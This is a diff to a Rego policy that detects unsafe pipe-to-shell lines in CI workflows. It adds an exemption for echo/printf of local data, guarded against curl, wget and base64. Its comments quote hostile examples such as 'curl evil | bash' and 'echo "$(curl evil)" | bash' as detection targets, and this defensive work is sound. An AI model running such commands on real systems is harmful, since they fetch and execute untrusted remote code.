@@ -12,6 +12,10 @@
 # same line as a curl/wget/base64 download (`curl evil | bash <<EOF`)
 # does NOT shield it from detection — the operator-intent argument
 # only holds when the line itself isn't fetching external content.
+# A leading echo/printf piping in-workflow data into an interpreter
+# (`echo "$VAR" | python3 -c ...`) is likewise exempt from the generic
+# pattern only, and only when no curl/wget/base64 is on the line
+# (issue #236).
 #
 # Lines that include a checksum / signature verification command on
 # the same line (sha256sum, shasum, gpg --verify, cosign verify, …)
@@ -97,10 +101,30 @@ _unsafe_script_line(visible, _) if {
 # Generic `<anything> | <shell>` catch-all. Skipped on heredoc-marker
 # lines because `cat <<EOF | bash` is in-tree operator-authored content
 # — but only when the line isn't ALSO matching one of the more specific
-# patterns above (those run regardless of heredoc presence).
+# patterns above (those run regardless of heredoc presence). Also
+# skipped when the line is a leading echo/printf of in-workflow data
+# (issue #236): piping a local variable into an interpreter is not a
+# remote-code fetch.
 _unsafe_script_line(visible, line) if {
 	not _has_heredoc(line)
+	not _echo_of_local_data(visible, line)
 	regex.match(sprintf(`(?i)\|\s*(sudo\s+)?(%s)\b`, [_shell]), visible)
+}
+
+# A line that starts with echo/printf and carries no curl/wget/base64
+# pipes operator-authored or in-workflow data (a variable, the `needs`
+# context) into the interpreter — local data, not a download (issue
+# #236: electron's `echo "$NEEDS_CONTEXT" | python3 -c ...`). Scoped
+# to the generic catch-all only: the download patterns and the
+# Megalodon `echo | base64 -d | bash` chain match through their own
+# bodies regardless, and the curl/wget/base64 guard means any fetch or
+# decode on the line voids the exemption. The fetch check runs against
+# the RAW line, not `visible`: a curl hidden in a quoted command
+# substitution (`echo "$(curl evil)" | bash`) is stripped by
+# _visible_line, so checking `visible` would let it through (issue #236).
+_echo_of_local_data(visible, line) if {
+	regex.match(`(?i)^\s*(echo|printf)\b`, visible)
+	not regex.match(`(?i)\b(curl|wget|base64)\b`, line)
 }
 
 _line_is_verified(line) if {
